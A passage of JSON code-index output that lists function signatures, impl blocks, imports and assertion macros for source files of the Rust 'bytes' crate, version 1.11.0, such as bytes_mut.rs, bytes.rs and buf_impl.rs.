          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &&'a T) -> bool {",
          "fn partial_cmp(&self, other: &&'a T) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn partial_cmp(&self, other: &BytesMut) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &BytesMut) -> bool {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn from(bytes: BytesMut) -> Self {",
          "fn vptr(ptr: *mut u8) -> NonNull<u8> {",
          "fn invalid_ptr<T>(addr: usize) -> *mut T {",
          "fn _split_to_must_use() {}",
          "fn _split_off_must_use() {}",
          "fn _split_must_use() {}",
          "fn bytes_mut_cloning_frozen() {"
        ],
        "struct_defs": [
          "struct Shared {"
        ],
        "impl_blocks": [
          "impl BytesMut {",
          "impl Drop for BytesMut {",
          "impl Buf for BytesMut {",
          "impl AsRef<[u8]> for BytesMut {",
          "impl Deref for BytesMut {",
          "impl AsMut<[u8]> for BytesMut {",
          "impl DerefMut for BytesMut {",
          "impl From<BytesMut> for Bytes {",
          "impl PartialEq for BytesMut {",
          "impl PartialOrd for BytesMut {",
          "impl Ord for BytesMut {",
          "impl Eq for BytesMut {}",
          "impl Default for BytesMut {",
          "impl hash::Hash for BytesMut {",
          "impl Borrow<[u8]> for BytesMut {",
          "impl BorrowMut<[u8]> for BytesMut {",
          "impl fmt::Write for BytesMut {",
          "impl Clone for BytesMut {",
          "impl IntoIterator for BytesMut {",
          "impl Extend<u8> for BytesMut {",
          "impl Extend<Bytes> for BytesMut {",
          "impl FromIterator<u8> for BytesMut {",
          "impl Shared {",
          "impl PartialEq<[u8]> for BytesMut {",
          "impl PartialOrd<[u8]> for BytesMut {",
          "impl PartialEq<BytesMut> for [u8] {",
          "impl PartialOrd<BytesMut> for [u8] {",
          "impl PartialEq<str> for BytesMut {",
          "impl PartialOrd<str> for BytesMut {",
          "impl PartialEq<BytesMut> for str {",
          "impl PartialOrd<BytesMut> for str {",
          "impl PartialEq<Vec<u8>> for BytesMut {",
          "impl PartialOrd<Vec<u8>> for BytesMut {",
          "impl PartialEq<BytesMut> for Vec<u8> {",
          "impl PartialOrd<BytesMut> for Vec<u8> {",
          "impl PartialEq<String> for BytesMut {",
          "impl PartialOrd<String> for BytesMut {",
          "impl PartialEq<BytesMut> for String {",
          "impl PartialOrd<BytesMut> for String {",
          "impl PartialEq<BytesMut> for &[u8] {",
          "impl PartialOrd<BytesMut> for &[u8] {",
          "impl PartialEq<BytesMut> for &str {",
          "impl PartialOrd<BytesMut> for &str {",
          "impl PartialEq<BytesMut> for Bytes {",
          "impl PartialEq<Bytes> for BytesMut {",
          "impl From<BytesMut> for Vec<u8> {"
        ],
        "uses": [
          "use core::mem::{self, ManuallyDrop, MaybeUninit};",
          "use core::ops::{Deref, DerefMut};",
          "use core::ptr::{self, NonNull};",
          "use core::{cmp, fmt, hash, slice};",
          "use alloc::{",
          "use crate::buf::{IntoIter, UninitSlice};",
          "use crate::bytes::Vtable;",
          "use crate::loom::sync::atomic::AtomicMut;",
          "use crate::loom::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};",
          "use crate::{Buf, BufMut, Bytes, TryGetError};",
          "use super::*;",
          "use loom::sync::Arc;",
          "use loom::thread;",
          "use super::BytesMut;",
          "use crate::Bytes;"
        ],
        "macros": [
          "/// assert_eq!(&buf[..], b\"hello\");",
          "/// assert_eq!(&a[..], b\"hello\");",
          "/// assert_eq!(&b[..], b\"hello\");",
          "/// assert_eq!(bytes.len(), 0);",
          "/// assert_eq!(&bytes[..], b\"hello world\");",
          "/// assert_eq!(0, bytes.len());",
          "/// assert_eq!(&b\"xy\"[..], &bytes[..]);",
          "/// assert_eq!(b.len(), 5);",
          "/// assert!(b.is_empty());",
          "/// assert_eq!(b.capacity(), 64);",
          "///     assert_eq!(&b1[..], b\"hello world\");",
          "/// assert_eq!(&b2[..], b\"hello world\");",
          "debug_assert_eq!(bytes.kind(), KIND_ARC);",
          "/// assert!(zeros.capacity() >= 42);",
          "/// assert_eq!(zeros.len(), 42);",
          "/// zeros.into_iter().for_each(|x| assert_eq!(x, 0));",
          "/// assert_eq!(&a[..], b\"jello\");",
          "/// assert_eq!(&b[..], b\"!world\");",
          "assert!(",
          "/// assert!(buf.is_empty());",
          "/// assert_eq!(1013, buf.capacity());",
          "/// assert_eq!(other, b\"hello world\"[..]);",
          "/// assert_eq!(&a[..], b\"!world\");",
          "/// assert_eq!(&b[..], b\"jello\");",
          "assert!(",
          "/// assert_eq!(buf, b\"hello\"[..]);",
          "/// assert!(buf.is_empty());",
          "/// assert_eq!(&buf[..], &[0x1, 0x1, 0x1]);",
          "/// assert_eq!(&buf[..], &[0x1, 0x1]);",
          "/// assert_eq!(&buf[..], &[0x1, 0x1, 0x3, 0x3]);",
          "/// assert_eq!(&b[..], b\"hello\");",
          "/// assert_eq!(&b[..], b\"hello world\");",
          "debug_assert!(len <= self.cap, \"set_len out of bounds\");",
          "/// assert!(buf.capacity() >= 69);",
          "/// assert!(buf.is_empty());",
          "/// assert_eq!(buf.capacity(), 64);",
          "/// assert_eq!(buf.capacity(), 128);",
          "/// assert_eq!(buf.as_ptr(), ptr);",
          "debug_assert_eq!(self.len, v.len() - off);",
          "debug_assert_eq!(kind, KIND_ARC);",
          "None => panic!(\"overflow\"),",
          "debug_assert!(off + len <= v.capacity());",
          "debug_assert_eq!(self.len, v.len());",
          "/// assert_eq!(true, buf.try_reclaim(64));",
          "/// assert_eq!(64, buf.capacity());",
          "/// assert_eq!(60, buf.capacity());",
          "/// assert_eq!(4, split.capacity());",
          "/// assert_eq!(false, split.try_reclaim(64));",
          "/// assert_eq!(false, buf.try_reclaim(64));",
          "/// assert_eq!(false, split.try_reclaim(4));",
          "/// assert_eq!(true, buf.try_reclaim(60));",
          "/// assert_eq!(false, split.try_reclaim(64));",
          "/// assert_eq!(4, split.capacity());",
          "/// assert_eq!(true, split.try_reclaim(64));",
          "/// assert_eq!(64, split.capacity());",
          "/// assert_eq!(b\"aaabbbcccddd\", &buf[..]);",
          "debug_assert!(dst.len() >= cnt);",
          "/// assert_eq!(b\"aaabbb\", &buf[..]);",
          "/// assert_eq!(b\"cccddd\", &split[..]);",
          "/// assert_eq!(b\"aaabbbcccddd\", &buf[..]);",
          "debug_assert!(count <= self.cap, \"internal: set_start out of bounds\");",
          "debug_assert_eq!(self.kind(), KIND_VEC);",
          "debug_assert!(ref_cnt == 1 || ref_cnt == 2);",
          "debug_assert_eq!(shared as usize & KIND_MASK, KIND_ARC);",
          "debug_assert_eq!(self.kind(), KIND_VEC);",
          "debug_assert_eq!(self.kind(), KIND_VEC);",
          "debug_assert!(pos <= MAX_VEC_POS);",
          "/// assert_eq!(&buf[..], &[0, 1, 2]);",
          "assert!(",
          "debug_assert!(dst.len() >= cnt);",
          "assert_eq!(original_capacity_to_repr(0), 0);",
          "assert_eq!(original_capacity_to_repr(cap), expected);",
          "assert_eq!(original_capacity_to_repr(cap + 1), expected);",
          "assert_eq!(original_capacity_to_repr(cap - 24), expected - 1);",
          "assert_eq!(original_capacity_to_repr(cap + 76), expected);",
          "assert_eq!(original_capacity_to_repr(cap - 1), expected - 1);",
          "assert_eq!(original_capacity_to_repr(cap - 48), expected - 1);",
          "assert_eq!(0, original_capacity_from_repr(0));",
          "assert_eq!(min_cap, original_capacity_from_repr(1));",
          "assert_eq!(min_cap * 2, original_capacity_from_repr(2));",
          "assert_eq!(min_cap * 4, original_capacity_from_repr(3));",
          "assert_eq!(min_cap * 8, original_capacity_from_repr(4));",
          "assert_eq!(min_cap * 16, original_capacity_from_repr(5));",
          "assert_eq!(min_cap * 32, original_capacity_from_repr(6));",
          "assert_eq!(min_cap * 64, original_capacity_from_repr(7));",
          "if cfg!(debug_assertions) {",
          "debug_assert_eq!(ptr as usize, addr);",
          "assert_eq!(b.as_ptr() as usize, addr);",
          "assert_eq!(b.as_ptr() as usize, addr);"
        ],
        "derives": [],
        "error_handling": 10
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/lib.rs",
        "function_defs": [
          "fn abort() -> ! {",
          "fn drop(&mut self) {",
          "fn saturating_sub_usize_u64(a: usize, b: u64) -> usize {",
          "fn min_u64_usize(a: u64, b: usize) -> usize {",
          "fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> Result<(), core::fmt::Error> {",
          "fn from(error: TryGetError) -> Self {",
          "fn panic_advance(error_info: &TryGetError) -> ! {",
          "fn panic_does_not_fit(size: usize, nbytes: usize) -> ! {"
        ],
        "struct_defs": [
          "struct Abort;"
        ],
        "impl_blocks": [
          "impl Drop for Abort {",
          "impl core::fmt::Display for TryGetError {",
          "impl std::error::Error for TryGetError {}",
          "impl From<TryGetError> for std::io::Error {"
        ],
        "uses": [],
        "macros": [
          "//! assert_eq!(a, b\"hello world\\x04\\xD2\"[..]);",
          "//! assert_eq!(b, b\"goodbye world\"[..]);",
          "//! assert_eq!(buf.capacity(), 998);",
          "panic!();",
          "panic!(\"abort\");",
          "write!(",
          "panic!(",
          "panic!("
        ],
        "derives": [
          "#[derive(Debug, PartialEq, Eq)]"
        ],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/bytes.rs",
        "function_defs": [
          "fn new_empty_with_ptr(ptr: *const u8) -> Self {",
          "fn as_slice(&self) -> &[u8] {",
          "fn drop(&mut self) {",
          "fn clone(&self) -> Bytes {",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, cnt: usize) {",
          "fn copy_to_bytes(&mut self, len: usize) -> Self {",
          "fn deref(&self) -> &[u8] {",
          "fn as_ref(&self) -> &[u8] {",
          "fn hash<H>(&self, state: &mut H)",
          "fn borrow(&self) -> &[u8] {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn into_iter(self) -> Self::IntoIter {",
          "fn from_iter<T: IntoIterator<Item = u8>>(into_iter: T) -> Self {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn cmp(&self, other: &Bytes) -> cmp::Ordering {",
          "fn eq(&self, other: &[u8]) -> bool {",
          "fn partial_cmp(&self, other: &[u8]) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &str) -> bool {",
          "fn partial_cmp(&self, other: &str) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Vec<u8>) -> bool {",
          "fn partial_cmp(&self, other: &Vec<u8>) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &String) -> bool {",
          "fn partial_cmp(&self, other: &String) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &Bytes) -> bool {",
          "fn partial_cmp(&self, other: &Bytes) -> Option<cmp::Ordering> {",
          "fn eq(&self, other: &&'a T) -> bool {",
          "fn partial_cmp(&self, other: &&'a T) -> Option<cmp::Ordering> {",
          "fn default() -> Bytes {",
          "fn from(slice: &'static [u8]) -> Bytes {",
          "fn from(slice: &'static str) -> Bytes {",
          "fn from(vec: Vec<u8>) -> Bytes {",
          "fn from(slice: Box<[u8]>) -> Bytes {",
          "fn from(bytes: Bytes) -> Self {",
          "fn from(s: String) -> Bytes {",
          "fn from(bytes: Bytes) -> Vec<u8> {",
          "fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {",
          "fn static_is_unique(_: &AtomicPtr<()>) -> bool {",
          "fn drop(&mut self) {",
          "fn ptr_map<F>(ptr: *mut u8, f: F) -> *mut u8",
          "fn ptr_map<F>(ptr: *mut u8, f: F) -> *mut u8",
          "fn without_provenance(ptr: usize) -> *const u8 {",
          "fn _split_to_must_use() {}",
          "fn _split_off_must_use() {}",
          "fn bytes_cloning_vec() {"
        ],
        "struct_defs": [
          "struct Owned<T> {",
          "struct Shared {"
        ],
        "impl_blocks": [
          "impl Bytes {",
          "impl Drop for Bytes {",
          "impl Clone for Bytes {",
          "impl Buf for Bytes {",
          "impl Deref for Bytes {",
          "impl AsRef<[u8]> for Bytes {",
          "impl hash::Hash for Bytes {",
          "impl Borrow<[u8]> for Bytes {",
          "impl IntoIterator for Bytes {",
          "impl FromIterator<u8> for Bytes {",
          "impl PartialEq for Bytes {",
          "impl PartialOrd for Bytes {",
          "impl Ord for Bytes {",
          "impl Eq for Bytes {}",
          "impl PartialEq<[u8]> for Bytes {",
          "impl PartialOrd<[u8]> for Bytes {",
          "impl PartialEq<Bytes> for [u8] {",
          "impl PartialOrd<Bytes> for [u8] {",
          "impl PartialEq<str> for Bytes {",
          "impl PartialOrd<str> for Bytes {",
          "impl PartialEq<Bytes> for str {",
          "impl PartialOrd<Bytes> for str {",
          "impl PartialEq<Vec<u8>> for Bytes {",
          "impl PartialOrd<Vec<u8>> for Bytes {",
          "impl PartialEq<Bytes> for Vec<u8> {",
          "impl PartialOrd<Bytes> for Vec<u8> {",
          "impl PartialEq<String> for Bytes {",
          "impl PartialOrd<String> for Bytes {",
          "impl PartialEq<Bytes> for String {",
          "impl PartialOrd<Bytes> for String {",
          "impl PartialEq<Bytes> for &[u8] {",
          "impl PartialOrd<Bytes> for &[u8] {",
          "impl PartialEq<Bytes> for &str {",
          "impl PartialOrd<Bytes> for &str {",
          "impl Default for Bytes {",
          "impl From<&'static [u8]> for Bytes {",
          "impl From<&'static str> for Bytes {",
          "impl From<Vec<u8>> for Bytes {",
          "impl From<Box<[u8]>> for Bytes {",
          "impl From<Bytes> for BytesMut {",
          "impl From<String> for Bytes {",
          "impl From<Bytes> for Vec<u8> {",
          "impl fmt::Debug for Vtable {",
          "impl Drop for Shared {"
        ],
        "uses": [
          "use core::mem::{self, ManuallyDrop};",
          "use core::ops::{Deref, RangeBounds};",
          "use core::ptr::NonNull;",
          "use core::{cmp, fmt, hash, ptr, slice};",
          "use alloc::{",
          "use crate::buf::IntoIter;",
          "use crate::loom::sync::atomic::AtomicMut;",
          "use crate::loom::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};",
          "use crate::{Buf, BytesMut};",
          "use core::ops::Bound;",
          "use loom::sync::Arc;",
          "use loom::thread;",
          "use super::Bytes;"
        ],
        "macros": [
          "/// assert_eq!(a, \"Hello\");",
          "/// assert_eq!(mem, \"world\");",
          "/// assert_eq!(b, \"Hello \");",
          "/// assert_eq!(&b[..], b\"\");",
          "/// assert_eq!(&b[..], b\"hello\");",
          "debug_assert!(!ptr.is_null());",
          "/// assert_eq!(b.len(), 5);",
          "/// assert!(b.is_empty());",
          "/// assert!(a.is_unique());",
          "/// assert!(!a.is_unique());",
          "/// assert_eq!(&b[..], b\"llo\");",
          "assert!(",
          "assert!(",
          "/// assert_eq!(&subslice[..], b\"2345\");",
          "assert!(",
          "assert!(",
          "/// assert_eq!(&a[..], b\"hello\");",
          "/// assert_eq!(&b[..], b\" world\");",
          "assert!(",
          "/// assert_eq!(&a[..], b\" world\");",
          "/// assert_eq!(&b[..], b\"hello\");",
          "assert!(",
          "/// assert_eq!(buf, b\"hello\"[..]);",
          "/// assert!(buf.is_empty());",
          "/// assert_eq!(bytes.try_into_mut(), Ok(BytesMut::from(&b\"hello\"[..])));",
          "debug_assert!(self.len >= by, \"internal: inc_start out of bounds\");",
          "assert!(",
          "debug_assert!(",
          "/// assert_eq!(BytesMut::from(bytes), BytesMut::from(&b\"hello\"[..]));",
          "debug_assert!(",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert_eq!(kind, KIND_VEC);",
          "debug_assert!(",
          "debug_assert!(core::ptr::eq(actual, ptr));",
          "assert_eq!(b.as_ptr() as usize, addr);",
          "assert_eq!(b.as_ptr() as usize, addr);"
        ],
        "derives": [],
        "error_handling": 16
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/loom.rs",
        "function_defs": [
          "fn with_mut<F, R>(&mut self, f: F) -> R",
          "fn with_mut<F, R>(&mut self, f: F) -> R"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/fmt/mod.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut Formatter<'_>) -> Result {"
        ],
        "struct_defs": [
          "struct BytesRef<'a>(&'a [u8]);"
        ],
        "impl_blocks": [
          "impl $tr for $ty {"
        ],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/fmt/debug.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut Formatter<'_>) -> Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Debug for BytesRef<'_> {"
        ],
        "uses": [
          "use core::fmt::{Debug, Formatter, Result};",
          "use super::BytesRef;",
          "use crate::{Bytes, BytesMut};"
        ],
        "macros": [
          "write!(f, \"b\\\"\")?;",
          "write!(f, \"\\\\n\")?;",
          "write!(f, \"\\\\r\")?;",
          "write!(f, \"\\\\t\")?;",
          "write!(f, \"\\\\{}\", b as char)?;",
          "write!(f, \"\\\\0\")?;",
          "write!(f, \"{}\", b as char)?;",
          "write!(f, \"\\\\x{:02x}\", b)?;",
          "write!(f, \"\\\"\")?;",
          "fmt_impl!(Debug, Bytes);",
          "fmt_impl!(Debug, BytesMut);"
        ],
        "derives": [],
        "error_handling": 9
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/fmt/hex.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut Formatter<'_>) -> Result {",
          "fn fmt(&self, f: &mut Formatter<'_>) -> Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl LowerHex for BytesRef<'_> {",
          "impl UpperHex for BytesRef<'_> {"
        ],
        "uses": [
          "use core::fmt::{Formatter, LowerHex, Result, UpperHex};",
          "use super::BytesRef;",
          "use crate::{Bytes, BytesMut};"
        ],
        "macros": [
          "write!(f, \"{:02x}\", b)?;",
          "write!(f, \"{:02X}\", b)?;",
          "fmt_impl!(LowerHex, Bytes);",
          "fmt_impl!(LowerHex, BytesMut);",
          "fmt_impl!(UpperHex, Bytes);",
          "fmt_impl!(UpperHex, BytesMut);"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/limit.rs",
        "function_defs": [
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::buf::UninitSlice;",
          "use crate::BufMut;",
          "use core::cmp;"
        ],
        "macros": [
          "assert!(cnt <= self.limit);"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/chain.rs",
        "function_defs": [
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, mut cnt: usize) {",
          "fn chunks_vectored<'a>(&'a self, dst: &mut [IoSlice<'a>]) -> usize {",
          "fn copy_to_bytes(&mut self, len: usize) -> crate::Bytes {",
          "fn remaining_mut(&self) -> usize {",
          "fn chunk_mut(&mut self) -> &mut UninitSlice {",
          "fn into_iter(self) -> Self::IntoIter {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::buf::{IntoIter, UninitSlice};",
          "use crate::{Buf, BufMut};",
          "use std::io::IoSlice;"
        ],
        "macros": [
          "/// assert_eq!(full[..], b\"hello world\"[..]);",
          "/// assert_eq!(buf.first_ref()[..], b\"hello\"[..]);",
          "/// assert_eq!(full, b\"elloworld\"[..]);",
          "/// assert_eq!(buf.last_ref()[..], b\"world\"[..]);",
          "/// assert_eq!(full, b\"hello orld\"[..]);",
          "/// assert_eq!(first[..], b\"hello\"[..]);",
          "/// assert_eq!(last[..], b\"world\"[..]);",
          "assert!("
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/iter.rs",
        "function_defs": [
          "fn next(&mut self) -> Option<u8> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::Buf;"
        ],
        "macros": [
          "/// assert_eq!(iter.next(), Some(b'a'));",
          "/// assert_eq!(iter.next(), Some(b'b'));",
          "/// assert_eq!(iter.next(), Some(b'c'));",
          "/// assert_eq!(iter.next(), None);",
          "/// assert_eq!(iter.next(), Some(b'a'));",
          "/// assert_eq!(iter.next(), Some(b'b'));",
          "/// assert_eq!(iter.next(), Some(b'c'));",
          "/// assert_eq!(iter.next(), None);",
          "/// assert_eq!(iter.next(), Some(b'a'));",
          "/// assert_eq!(2, buf.remaining());",
          "/// assert_eq!(iter.next(), Some(b'a'));",
          "/// assert_eq!(2, iter.get_ref().remaining());",
          "/// assert_eq!(iter.next(), Some(b'a'));",
          "/// assert_eq!(iter.next(), Some(b'c'));"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/mod.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/buf_impl.rs",
        "function_defs": [
          "fn sign_extend(val: u64, nbytes: usize) -> i64 {",
          "fn remaining(&self) -> usize;",
          "fn chunk(&self) -> &[u8];",
          "fn chunks_vectored<'a>(&'a self, dst: &mut [IoSlice<'a>]) -> usize {",
          "fn advance(&mut self, cnt: usize);",
          "fn has_remaining(&self) -> bool {",
          "fn copy_to_slice(&mut self, dst: &mut [u8]) {",
          "fn get_u8(&mut self) -> u8 {",
          "fn get_i8(&mut self) -> i8 {",
          "fn get_u16(&mut self) -> u16 {",
          "fn get_u16_le(&mut self) -> u16 {",
          "fn get_u16_ne(&mut self) -> u16 {",
          "fn get_i16(&mut self) -> i16 {",
          "fn get_i16_le(&mut self) -> i16 {",
          "fn get_i16_ne(&mut self) -> i16 {",
          "fn get_u32(&mut self) -> u32 {",
          "fn get_u32_le(&mut self) -> u32 {",
          "fn get_u32_ne(&mut self) -> u32 {",
          "fn get_i32(&mut self) -> i32 {",
          "fn get_i32_le(&mut self) -> i32 {",
          "fn get_i32_ne(&mut self) -> i32 {",
          "fn get_u64(&mut self) -> u64 {",
          "fn get_u64_le(&mut self) -> u64 {",
          "fn get_u64_ne(&mut self) -> u64 {",
          "fn get_i64(&mut self) -> i64 {",
          "fn get_i64_le(&mut self) -> i64 {",
          "fn get_i64_ne(&mut self) -> i64 {",
          "fn get_u128(&mut self) -> u128 {",
          "fn get_u128_le(&mut self) -> u128 {",
          "fn get_u128_ne(&mut self) -> u128 {",
          "fn get_i128(&mut self) -> i128 {",
          "fn get_i128_le(&mut self) -> i128 {",
          "fn get_i128_ne(&mut self) -> i128 {",
          "fn get_uint(&mut self, nbytes: usize) -> u64 {",
          "fn get_uint_le(&mut self, nbytes: usize) -> u64 {",
          "fn get_uint_ne(&mut self, nbytes: usize) -> u64 {",
          "fn get_int(&mut self, nbytes: usize) -> i64 {",
          "fn get_int_le(&mut self, nbytes: usize) -> i64 {",
          "fn get_int_ne(&mut self, nbytes: usize) -> i64 {",
          "fn get_f32(&mut self) -> f32 {",
          "fn get_f32_le(&mut self) -> f32 {",
          "fn get_f32_ne(&mut self) -> f32 {",
          "fn get_f64(&mut self) -> f64 {",
          "fn get_f64_le(&mut self) -> f64 {",
          "fn get_f64_ne(&mut self) -> f64 {",
          "fn try_copy_to_slice(&mut self, mut dst: &mut [u8]) -> Result<(), TryGetError> {",
          "fn try_get_u8(&mut self) -> Result<u8, TryGetError> {",
          "fn try_get_i8(&mut self) -> Result<i8, TryGetError> {",
          "fn try_get_u16(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_u16_le(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_u16_ne(&mut self) -> Result<u16, TryGetError> {",
          "fn try_get_i16(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_i16_le(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_i16_ne(&mut self) -> Result<i16, TryGetError> {",
          "fn try_get_u32(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_u32_le(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_u32_ne(&mut self) -> Result<u32, TryGetError> {",
          "fn try_get_i32(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_i32_le(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_i32_ne(&mut self) -> Result<i32, TryGetError> {",
          "fn try_get_u64(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_u64_le(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_u64_ne(&mut self) -> Result<u64, TryGetError> {",
          "fn try_get_i64(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_i64_le(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_i64_ne(&mut self) -> Result<i64, TryGetError> {",
          "fn try_get_u128(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_u128_le(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_u128_ne(&mut self) -> Result<u128, TryGetError> {",
          "fn try_get_i128(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_i128_le(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_i128_ne(&mut self) -> Result<i128, TryGetError> {",
          "fn try_get_uint(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_uint_le(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_uint_ne(&mut self, nbytes: usize) -> Result<u64, TryGetError> {",
          "fn try_get_int(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_int_le(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_int_ne(&mut self, nbytes: usize) -> Result<i64, TryGetError> {",
          "fn try_get_f32(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f32_le(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f32_ne(&mut self) -> Result<f32, TryGetError> {",
          "fn try_get_f64(&mut self) -> Result<f64, TryGetError> {",
          "fn try_get_f64_le(&mut self) -> Result<f64, TryGetError> {",
          "fn try_get_f64_ne(&mut self) -> Result<f64, TryGetError> {",
          "fn copy_to_bytes(&mut self, len: usize) -> crate::Bytes {",
          "fn take(self, limit: usize) -> Take<Self>",
          "fn chain<U: Buf>(self, next: U) -> Chain<Self, U>",
          "fn reader(self) -> Reader<Self>",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn chunks_vectored<'b>(&'b self, dst: &mut [IoSlice<'b>]) -> usize {",
          "fn advance(&mut self, cnt: usize) {",
          "fn has_remaining(&self) -> bool {",
          "fn copy_to_slice(&mut self, dst: &mut [u8]) {",
          "fn get_u8(&mut self) -> u8 {",
          "fn get_i8(&mut self) -> i8 {",
          "fn get_u16(&mut self) -> u16 {",
          "fn get_u16_le(&mut self) -> u16 {",
          "fn get_u16_ne(&mut self) -> u16 {",
          "fn get_i16(&mut self) -> i16 {",
          "fn get_i16_le(&mut self) -> i16 {",
          "fn get_i16_ne(&mut self) -> i16 {",
          "fn get_u32(&mut self) -> u32 {",
          "fn get_u32_le(&mut self) -> u32 {",
          "fn get_u32_ne(&mut self) -> u32 {",
          "fn get_i32(&mut self) -> i32 {",
          "fn get_i32_le(&mut self) -> i32 {",
          "fn get_i32_ne(&mut self) -> i32 {",
          "fn get_u64(&mut self) -> u64 {",
          "fn get_u64_le(&mut self) -> u64 {",
          "fn get_u64_ne(&mut self) -> u64 {",
          "fn get_i64(&mut self) -> i64 {",
          "fn get_i64_le(&mut self) -> i64 {",
          "fn get_i64_ne(&mut self) -> i64 {",
          "fn get_u128(&mut self) -> u128 {",
          "fn get_u128_le(&mut self) -> u128 {",
